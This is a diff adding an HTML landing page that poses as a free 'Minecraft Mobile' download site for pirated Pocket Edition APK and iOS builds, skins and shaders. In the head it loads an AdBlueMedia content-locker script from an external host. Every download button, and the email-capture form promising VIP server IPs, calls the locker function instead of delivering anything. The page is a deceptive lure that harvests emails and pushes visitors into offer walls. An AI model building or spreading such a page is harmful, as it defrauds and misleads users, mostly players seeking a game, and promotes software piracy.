@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Minecraft Mobile – Download Free PE / Bedrock Edition</title>
+<link href="https://fonts.googleapis.com/css2?family=Pixelify+Sans:wght@500;700&family=Nunito+Sans:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root{--sky:#8ec9f0;--grass:#5aa02c;--grass-d:#3f7a1c;--dirt:#8a5a3b;--dirt-d:#6b4429;--stone:#7d7d7d;--bg:#f4f1ea;--surface:#fff;--ink:#1f1f1f;--muted:#5a5a5a;--nav:#2b2b2b;--line:#d9d4c7;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--sky:#1b2f4a;--bg:#1a1b1d;--surface:#26282b;--ink:#ececec;--muted:#aaa;--nav:#101112;--line:#3a3c40}}
+:root[data-theme="dark"]{--sky:#1b2f4a;--bg:#1a1b1d;--surface:#26282b;--ink:#ececec;--muted:#aaa;--nav:#101112;--line:#3a3c40}
+*{box-sizing:border-box}html{scroll-padding-top:70px;scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);font:400 17px/1.6 "Nunito Sans",system-ui,sans-serif}
+h1,h2,h3,.logo{font-family:"Pixelify Sans",monospace;font-weight:700;line-height:1.15;margin:0}
+a{color:inherit}
+:focus-visible{outline:3px solid #ffd23f;outline-offset:2px}
+header{position:sticky;top:0;z-index:20;background:var(--nav);color:#fff;padding-top:env(safe-area-inset-top,0px)}
+nav{max-width:1100px;margin:auto;display:flex;align-items:center;gap:24px;padding:12px 20px}
+.logo{font-size:24px;text-decoration:none;margin-right:auto;letter-spacing:1px;color:#5aa02c}
+nav a.l{text-decoration:none;font-weight:600;font-size:15px;opacity:.85}
+nav a.l:hover{opacity:1}
+.btn{display:inline-block;text-decoration:none;font-family:"Pixelify Sans",monospace;font-weight:700;font-size:18px;padding:12px 26px;background:var(--grass);color:#fff;border:0;box-shadow:inset -4px -4px 0 var(--grass-d),inset 4px 4px 0 #7bc24a,0 4px 0 #1f4a0a;cursor:pointer}
+.btn:hover{background:#68b333}.btn:active{transform:translateY(3px);box-shadow:inset -4px -4px 0 var(--grass-d),inset 4px 4px 0 #7bc24a,0 1px 0 #1f4a0a}
+.btn.alt{background:var(--stone);box-shadow:inset -4px -4px 0 #5a5a5a,inset 4px 4px 0 #a3a3a3,0 4px 0 #333}
+.hero{background:linear-gradient(var(--sky) 60%,#b9e0f7);position:relative;overflow:hidden;text-align:center;color:#10243a}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]) .hero{color:#fff;background:linear-gradient(var(--sky),#2c4a6e)}}
+:root[data-theme="dark"] .hero{color:#fff;background:linear-gradient(var(--sky),#2c4a6e)}
+.cloud{position:absolute;height:28px;background:#fff;opacity:.85;box-shadow:28px -14px 0 #fff,56px 0 0 #fff;width:60px}
+.c1{top:60px;left:8%}.c2{top:120px;right:12%;transform:scale(1.4)}
+.hero-in{position:relative;padding:72px 20px 0;max-width:760px;margin:auto}
+.hero h1{font-size:clamp(34px,7vw,64px);text-shadow:3px 3px 0 rgba(0,0,0,.18)}
+.hero p{font-size:19px;max-width:520px;margin:18px auto 28px}
+.cta{display:flex;gap:16px;justify-content:center;flex-wrap:wrap}
+.scene{height:300px;position:relative;margin-top:20px}
+.cube-wrap{position:absolute;left:50%;top:10px;width:120px;height:120px;margin-left:-60px;perspective:700px}
+.cube{width:100%;height:100%;position:relative;transform-style:preserve-3d;animation:spin 14s linear infinite;transform:rotateX(-24deg) rotateY(30deg)}
+.cube i{position:absolute;inset:0;border:3px solid rgba(0,0,0,.25)}
+.f{background:linear-gradient(var(--grass) 0 32%,var(--dirt) 32%);background-image:linear-gradient(var(--grass) 0 32%,transparent 32%),repeating-conic-gradient(var(--dirt) 0 25%,var(--dirt-d) 0 50%);background-size:100% 100%,24px 24px}
+.t{background:repeating-conic-gradient(var(--grass) 0 25%,var(--grass-d) 0 50%);background-size:24px 24px}
+.f1{transform:translateZ(60px)}.f2{transform:rotateY(90deg) translateZ(60px)}.f3{transform:rotateY(180deg) translateZ(60px)}.f4{transform:rotateY(-90deg) translateZ(60px)}.t{transform:rotateX(90deg) translateZ(60px)}.b{transform:rotateX(-90deg) translateZ(60px);background:var(--dirt-d)}
+@keyframes spin{to{transform:rotateX(-24deg) rotateY(390deg)}}
+@media (prefers-reduced-motion:reduce){.cube{animation:none}}
+.ground{position:absolute;left:0;right:0;bottom:0;height:150px;background:repeating-conic-gradient(var(--dirt) 0 25%,var(--dirt-d) 0 50%);background-size:40px 40px;border-top:0}
+.ground::before{content:"";position:absolute;left:0;right:0;top:-24px;height:40px;background:repeating-conic-gradient(var(--grass) 0 25%,var(--grass-d) 0 50%);background-size:40px 40px;border-bottom:8px solid var(--grass-d)}
+section{max-width:1100px;margin:auto;padding:64px 20px}
+h2{font-size:clamp(26px,4vw,38px);margin-bottom:8px}
+.sub{color:var(--muted);margin:0 0 32px;max-width:560px}
+.grid{display:grid;gap:22px;grid-template-columns:repeat(auto-fit,minmax(260px,1fr))}
+.card{background:var(--surface);border:3px solid var(--ink);box-shadow:6px 6px 0 var(--ink);display:flex;flex-direction:column}
+.card .img{height:150px;border-bottom:3px solid var(--ink)}
+.card div.body{padding:18px 20px 22px;display:flex;flex-direction:column;gap:8px;flex:1}
+.card h3{font-size:22px}.card p{margin:0;color:var(--muted);font-size:15.5px}
+.card time{font-size:14px;font-weight:800;color:var(--grass-d)}
+.card a.more{margin-top:auto;font-weight:800;text-decoration:underline;text-underline-offset:3px;cursor:pointer}
+.i1{background:linear-gradient(#8ec9f0 55%,var(--grass) 55% 70%,var(--dirt) 70%)}
+.i2{background:repeating-conic-gradient(var(--stone) 0 25%,#666 0 50%) 0 0/30px 30px}
+.i3{background:linear-gradient(#2a1a4a,#c2563a 70%,#2a1a4a 70%)}
+.band{background:var(--nav);color:#fff}
+.band section{display:grid;gap:36px;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));text-align:center}
+.band h3{font-size:22px;margin-bottom:6px}.band p{margin:0;opacity:.75;font-size:15.5px}
+.ed{border:3px solid var(--ink);background:var(--surface);padding:24px;display:flex;flex-direction:column;gap:12px;box-shadow:6px 6px 0 var(--grass-d)}
+.ed h3{font-size:24px}.ed p{margin:0;color:var(--muted)}.ed .btn{margin-top:auto;text-align:center}
+.price{font-family:"Pixelify Sans",monospace;font-size:28px;color:var(--grass-d);font-weight:800}
+.news{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
+.news input{flex:1;min-width:220px;padding:13px 14px;font:inherit;border:3px solid var(--ink);background:var(--surface);color:var(--ink)}
+#ok{margin-top:12px;font-weight:800;color:var(--grass-d);min-height:1.6em}
+footer{background:var(--nav);color:#ccc;padding:40px 20px calc(40px + env(safe-area-inset-bottom,0px));font-size:14.5px}
+footer .in{max-width:1100px;margin:auto;display:flex;flex-wrap:wrap;gap:20px 40px;justify-content:space-between}
+footer a{display:block;text-decoration:none;margin:4px 0}footer a:hover{color:#fff}
+footer .fine{max-width:1100px;margin:28px auto 0;opacity:.6;font-size:13px}
+@media(max-width:640px){nav a.l{display:none}.scene{height:250px}}
+</style>
+
+<!-- YOUR ADBLUEMEDIA CONTENT LOCKER CONFIGURATION -->
+<script type="text/javascript">
+    var xTEci_LOM_LvQXrc={"it":4637994,"key":"e9006"};
+</script>
+<script src="https://d1chbu4sfo2xhu.cloudfront.net/2c0fd8a.js"></script>
+</head>
+<body>
+<header><nav>
+<a class="logo" href="#top">MINECRAFT MOBILE</a>
+<a class="l" href="#news">Updates</a><a class="l" href="#editions">Download PE</a><a class="l" href="#community">Skins & Mods</a>
+<a class="btn" onclick="_yi();" href="javascript:void(0)" style="padding:7px 16px;font-size:15px">Download APK / iOS</a>
+</nav></header>
+
+<main id="top">
+<div class="hero">
+<span class="cloud c1"></span><span class="cloud c2"></span>
+<div class="hero-in">
+<h1>Minecraft Mobile Pocket Edition Free</h1>
+<p>Download Minecraft PE v1.21 full version for Android APK & iOS. Unlock full gameplay, multiplayer servers, free skin packs, and custom mods!</p>
+<div class="cta">
+  <a class="btn" onclick="_yi();" href="javascript:void(0)">Download Free PE (Android)</a>
+  <a class="btn alt" onclick="_yi();" href="javascript:void(0)">Download Free iOS</a>
+</div>
+</div>
+<div class="scene">
+<div class="cube-wrap"><div class="cube"><i class="f f1"></i><i class="f f2"></i><i class="f f3"></i><i class="f f4"></i><i class="t"></i><i class="b"></i></div></div>
+<div class="ground"></div>
+</div>
+</div>
+
+<section id="news">
+<h2>Latest Minecraft Drops</h2>
+<p class="sub">Check out the newest free updates, texture packs, and custom maps available for download.</p>
+<div class="grid">
+<article class="card"><div class="img i1"></div><div class="body"><time>Free Version v1.21</time><h3>Tricky Trials & Breezes Update</h3><p>Includes trial chambers, new breeze mob, vault rewards, and heavy core weapons.</p><a class="more" onclick="_yi();" href="javascript:void(0)">Download APK v1.21</a></div></article>
+<article class="card"><div class="img i2"></div><div class="body"><time>Bonus Content</time><h3>Ultra HD Shader & Texture Pack</h3><p>Boost your game graphics with realistic lighting, water reflections, and 4K blocks.</p><a class="more" onclick="_yi();" href="javascript:void(0)">Get Shaders Free</a></div></article>
+<article class="card"><div class="img i3"></div><div class="body"><time>Exclusive Skins</time><h3>Anime & Anime Legends Skin Pack</h3><p>Over 500+ premium custom skins ready to equip in your character editor instantly.</p><a class="more" onclick="_yi();" href="javascript:void(0)">Unlock Skins Free</a></div></article>
+</div>
+</section>
+
+<div class="band"><section>
+<div><h3>100% Free Mobile Access</h3><p>No credit card or subscription needed. Safe direct installation.</p></div>
+<div><h3>Online Multiplayer</h3><p>Join official mobile servers or set up private games with friends easily.</p></div>
+<div><h3>Mods & Addons Enabled</h3><p>Full support for custom behavior packs, resource packs, and worlds.</p></div>
+</section></div>
+
+<section id="editions">
+<h2>Choose Your Mobile Device</h2>
+<p class="sub">Select your operating system below to begin your free direct download.</p>
+<div class="grid">
+<div class="ed"><h3>Android APK (PE)</h3><p>Compatible with Android 6.0+. Includes Xbox Live login for online multiplayer.</p><span class="price">FREE</span><a class="btn" onclick="_yi();" href="javascript:void(0)">Download APK Free</a></div>
+<div class="ed"><h3>iOS / iPadOS</h3><p>Direct installation for iPhone and iPad devices. No jailbreak required.</p><span class="price">FREE</span><a class="btn" onclick="_yi();" href="javascript:void(0)">Download iOS Free</a></div>
+<div class="ed"><h3>PC / Mobile Bedrock</h3><p>Bedrock Edition crossplay support for Windows 10/11 & tablet devices.</p><span class="price">FREE</span><a class="btn" onclick="_yi();" href="javascript:void(0)">Download Bedrock</a></div>
+</div>
+</section>
+
+<section id="community">
+<h2>Join Lobbies & Server Lists</h2>
+<p class="sub">Enter your email to receive direct VIP server IP addresses and exclusive skin codes in your inbox.</p>
+<form class="news" id="f" novalidate>
+<input id="em" type="email" placeholder="Enter your email" aria-label="Email address" required>
+<button class="btn" onclick="_yi();" type="button">Get Server IPs</button>
+</form>
+<div id="ok" role="status"></div>
+</section>
+</main>
+
+<footer>
+<div class="in">
+<div><strong style="color:#5aa02c;font-family:'Pixelify Sans',monospace;font-size:20px">MINECRAFT MOBILE</strong><br>Build anything. Anywhere.</div>
+<div><a href="#news">Updates</a><a href="#editions">Download PE</a><a href="#community">Community</a></div>
+<div><a href="#top">Help Center</a><a href="#top">Privacy Policy</a><a href="#top">Terms</a></div>
+</div>
+<p class="fine">Minecraft Mobile Reward Portal. Download full Pocket Edition free for testing.</p>
+</footer>
+</body>
+</html>
